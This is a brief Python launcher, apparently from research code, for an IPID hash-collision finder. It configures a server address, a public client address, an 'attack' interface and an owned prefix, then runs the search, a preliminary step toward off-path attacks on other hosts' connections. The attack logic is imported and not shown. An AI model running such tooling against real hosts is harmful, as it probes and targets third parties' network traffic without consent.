# coding=utf-8

import time

from IPID_HCSC.collision_find import Collision_Finder


if __name__ == '__main__':
    
    # server_ip = '172.21.0.12'
    # server_ip = '172.21.0.82'
    # server_ip = '172.21.0.14'
    # server_ip = '172.21.0.32'

    # client_ip = '182.92.129.182'
    server_ip = '172.21.0.12'
    client_ip = '61.137.215.26'
    attack_bind_if = 'eth0'
    own_ip_prefix = '10.10.0.0'

    collision = Collision_Finder(client_ip=client_ip, server_ip=server_ip,
                                 owned_prefix=own_ip_prefix, bind_iface=attack_bind_if)
    collision.run()
    collision_ip = collision.result

    print('------ Result ------')
    print(collision_ip)

